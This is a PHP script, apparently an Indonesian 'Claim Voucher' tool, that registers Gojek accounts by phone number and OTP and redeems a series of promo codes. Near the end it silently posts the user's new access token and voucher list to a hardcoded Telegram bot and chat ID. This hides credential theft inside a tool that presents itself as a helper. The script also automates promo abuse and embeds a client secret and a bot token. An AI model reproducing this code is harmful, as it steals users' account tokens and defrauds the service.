<?php
date_default_timezone_set('Asia/Jakarta');
include "function.php";
echo color("green"," =================================== \n");
echo color("green"," Claim Voucher \n");
echo color("green"," Auto Create & Redeem Voucher \n");
echo color("green"," =================================== \n");
echo " Created by : Vino AZR \n";
echo " Version    : 555 \n";
echo " Time       : ".date('d-m-Y||H:i:s')." \n";
echo color("green"," =================================== \n");

//	function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        ulang:
        echo color("nevy","?] Number : ");
        // $no = trim(fgets(STDIN));
        $nohp = trim(fgets(STDIN));
        $nohp = str_replace("62","62",$nohp);
        $nohp = str_replace("(","",$nohp);
        $nohp = str_replace(")","",$nohp);
        $nohp = str_replace("-","",$nohp);
        $nohp = str_replace(" ","",$nohp);

        if (!preg_match('/[^+0-9]/', trim($nohp))) {
            if (substr(trim($nohp),0,3)=='62') {
                $hp = trim($nohp);
            }
            else if (substr(trim($nohp),0,1)=='0') {
                $hp = '62'.substr(trim($nohp),1);
			}
			else if(substr(trim($nohp), 0, 2)=='62'){
				$hp = '6'.substr(trim($nohp), 1);
			}
			else{
				$hp = '1'.substr(trim($nohp),0,13);
			}
		}
		
		$data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
			$otptoken = getStr('"otp_token":"','"',$register);
			echo color("green","+] Verification code has been sent")."\n";
			otp:
			echo color("nevy","?] OTP : ");
			$otp = trim(fgets(STDIN));
			$data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
			$verif = request("/v5/customers/phone/verify", null, $data1);
			if(strpos($verif, '"access_token"')){
				echo color("green","+] Register Success\n");
				$token = getStr('"access_token":"','"',$verif);
				$uuid = getStr('"resource_owner_id":',',',$verif);
				echo color("green","+] Your access token : ".$token."\n\n");
				save("token.txt",$token);
				
				echo color("green","\n===========(REDEEM VOUCHER)===========");
				echo "\n".color("yellow","!] Claim Voc Car");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				sleep(3);
				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOCAR"}');
				$message = fetch_value($gocar,'"message":"','"');
				echo "\n".color("green","+] Message: ".$message);
				sleep(3);
				
				echo "\n".color("yellow","!] Claim Voc Ride");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				sleep(3);
				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGORIDE"}');
				$message = fetch_value($gocar,'"message":"','"');
				echo "\n".color("green","+] Message: ".$message);
				sleep(3);
				
				echo "\n".color("yellow","!] Claim Voc Food");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				sleep(3);
				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOOD022620A"}');
				$message = fetch_value($gocar,'"message":"','"');
				echo "\n".color("green","+] Message: ".$message);
				sleep(3);
				
				echo "\n".color("yellow","!] Claim Voc Cashbasck 4K");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				sleep(3);
				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"BELANJAINAJA"}');
				$message = fetch_value($gocar,'"message":"','"');
				echo "\n".color("green","+] Message: ".$message);
				sleep(3);
				
				echo "\n".color("yellow","!] Claim Voc Cashbasck 5K");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				sleep(3);
				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOPAYKIRIMPAKET"}');
				$message = fetch_value($gocar,'"message":"','"');
				echo "\n".color("green","+] Message: ".$message);
				sleep(3);
				
				echo "\n".color("yellow","!] Claim Voc Cashbasck 20K");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				sleep(3);
				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"DWIPUTRA"}');
				$message = fetch_value($gocar,'"message":"','"');
				echo "\n".color("green","+] Message: ".$message);
				sleep(3);
				
				$cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
				$total = fetch_value($cekvoucher,'"total_vouchers":',',');
				$voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
				$voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
				$voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
				$voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
				$voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
				$voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
				$voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
				$voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
				$voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
				$voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
				$voucher1 = getStr1('"title":"','",',$cekvoucher,"11");
				$voucher2 = getStr1('"title":"','",',$cekvoucher,"12");
				$voucher3 = getStr1('"title":"','",',$cekvoucher,"13");
				$voucher4 = getStr1('"title":"','",',$cekvoucher,"14");
				$voucher5 = getStr1('"title":"','",',$cekvoucher,"15");
				$voucher6 = getStr1('"title":"','",',$cekvoucher,"16");
				$voucher7 = getStr1('"title":"','",',$cekvoucher,"17");
				$voucher8 = getStr1('"title":"','",',$cekvoucher,"18");
				$voucher9 = getStr1('"title":"','",',$cekvoucher,"19");
				$voucher10 = getStr1('"title":"','",',$cekvoucher,"20");
				$voucher1 = getStr1('"title":"','",',$cekvoucher,"21");
				$voucher2 = getStr1('"title":"','",',$cekvoucher,"22");
				$voucher3 = getStr1('"title":"','",',$cekvoucher,"23");
				$voucher4 = getStr1('"title":"','",',$cekvoucher,"24");
				$voucher5 = getStr1('"title":"','",',$cekvoucher,"25");
				$voucher6 = getStr1('"title":"','",',$cekvoucher,"26");
				$voucher7 = getStr1('"title":"','",',$cekvoucher,"27");
				$voucher8 = getStr1('"title":"','",',$cekvoucher,"28");
				$voucher9 = getStr1('"title":"','",',$cekvoucher,"29");
				$voucher10 = getStr1('"title":"','",',$cekvoucher,"30");
				$voucher1 = getStr1('"title":"','",',$cekvoucher,"31");
				$voucher2 = getStr1('"title":"','",',$cekvoucher,"32");
				$voucher3 = getStr1('"title":"','",',$cekvoucher,"33");
				$voucher4 = getStr1('"title":"','",',$cekvoucher,"34");
				$voucher5 = getStr1('"title":"','",',$cekvoucher,"35");
				$voucher6 = getStr1('"title":"','",',$cekvoucher,"36");
				$voucher7 = getStr1('"title":"','",',$cekvoucher,"37");
				$voucher8 = getStr1('"title":"','",',$cekvoucher,"38");
				$voucher9 = getStr1('"title":"','",',$cekvoucher,"39");
				$voucher10 = getStr1('"title":"','",',$cekvoucher,"40");
				$voucher1 = getStr1('"title":"','",',$cekvoucher,"41");
				$voucher2 = getStr1('"title":"','",',$cekvoucher,"42");
				$voucher3 = getStr1('"title":"','",',$cekvoucher,"43");
				$voucher4 = getStr1('"title":"','",',$cekvoucher,"44");
				$voucher5 = getStr1('"title":"','",',$cekvoucher,"45");
				$voucher6 = getStr1('"title":"','",',$cekvoucher,"46");
				$voucher7 = getStr1('"title":"','",',$cekvoucher,"47");
				$voucher8 = getStr1('"title":"','",',$cekvoucher,"48");
				$voucher9 = getStr1('"title":"','",',$cekvoucher,"49");
				$voucher10 = getStr1('"title":"','",',$cekvoucher,"50");
				
				echo "\n".color("yellow","-> Total voucher ".$total." : ");
				echo "\n".color("green","1. ".$voucher1);
				echo "\n".color("green","2. ".$voucher2);
				echo "\n".color("green","3. ".$voucher3);
				echo "\n".color("green","4. ".$voucher4);
				echo "\n".color("green","5. ".$voucher5);
				echo "\n".color("green","6. ".$voucher6);
				echo "\n".color("green","7. ".$voucher7);
				echo "\n".color("green","7. ".$voucher8);
				echo "\n".color("green","7. ".$voucher9);
				echo "\n".color("green","7. ".$voucher10);
				echo "\n".color("green","1. ".$voucher11);
				echo "\n".color("green","2. ".$voucher12);
				echo "\n".color("green","3. ".$voucher13);
				echo "\n".color("green","4. ".$voucher14);
				echo "\n".color("green","5. ".$voucher15);
				echo "\n".color("green","6. ".$voucher16);
				echo "\n".color("green","7. ".$voucher17);
				echo "\n".color("green","7. ".$voucher18);
				echo "\n".color("green","7. ".$voucher19);
				echo "\n".color("green","7. ".$voucher20);
				echo "\n".color("green","1. ".$voucher21);
				echo "\n".color("green","2. ".$voucher22);
				echo "\n".color("green","3. ".$voucher23);
				echo "\n".color("green","4. ".$voucher24);
				echo "\n".color("green","5. ".$voucher25);
				echo "\n".color("green","6. ".$voucher26);
				echo "\n".color("green","7. ".$voucher27);
				echo "\n".color("green","7. ".$voucher28);
				echo "\n".color("green","7. ".$voucher29);
				echo "\n".color("green","7. ".$voucher30);
				echo "\n".color("green","1. ".$voucher31);
				echo "\n".color("green","2. ".$voucher32);
				echo "\n".color("green","3. ".$voucher33);
				echo "\n".color("green","4. ".$voucher34);
				echo "\n".color("green","5. ".$voucher35);
				echo "\n".color("green","6. ".$voucher36);
				echo "\n".color("green","7. ".$voucher37);
				echo "\n".color("green","7. ".$voucher38);
				echo "\n".color("green","7. ".$voucher39);
				echo "\n".color("green","7. ".$voucher40);
				echo "\n".color("green","1. ".$voucher41);
				echo "\n".color("green","2. ".$voucher42);
				echo "\n".color("green","3. ".$voucher43);
				echo "\n".color("green","4. ".$voucher44);
				echo "\n".color("green","5. ".$voucher45);
				echo "\n".color("green","6. ".$voucher46);
				echo "\n".color("green","7. ".$voucher47);
				echo "\n".color("green","7. ".$voucher48);
				echo "\n".color("green","7. ".$voucher49);
				echo "\n".color("green","7. ".$voucher50);
				echo"\n";
				
				$expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
				$expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
				$expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
				$expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
				$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
				$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
				$expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
				$expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
				$expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
				$expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'14');
				$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'15');
				$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'16');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'17');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'18');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'19');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'20');
				$expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'21');
				$expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'22');
				$expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'23');
				$expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'24');
				$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'25');
				$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'26');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'27');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'28');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'29');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'30');
				$expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'31');
				$expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'32');
				$expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'33');
				$expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'34');
				$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'35');
				$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'36');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'37');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'38');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'39');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'40');
				$expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'41');
				$expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'42');
				$expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'43');
				$expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'44');
				$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'45');
				$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'46');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'47');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'48');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'49');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'50');
				
				$TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
				$chatid = "785784404";
				$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
				$method	= "sendMessage";
				$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
				$post = ['chat_id' => $chatid, 'text' => $pesan];
				$header = ["X-Requested-With: XMLHttpRequest",
					"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"];
				$ch = curl_init();
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch, CURLOPT_URL, $url);
					curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
					curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				$datas = curl_exec($ch);
				$error = curl_error($ch);
				$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
					curl_close($ch);
				$debug['text'] = $pesan;
				$debug['respon'] = json_decode($datas, true);
			}else{
				echo color("red","-] The code you entered is incorrect");
				echo color("green", "\n =================================== \n\n");
				echo color("yellow","!] Please input again \n");
				goto otp;
			}
		}else{
			echo color("red","-] This number already registered");
			echo color("green", "\n =================================== \n\n");
			echo color("yellow","!] Please register again using other number \n");
			goto ulang;
		}
//	}
// echo change()."\n";
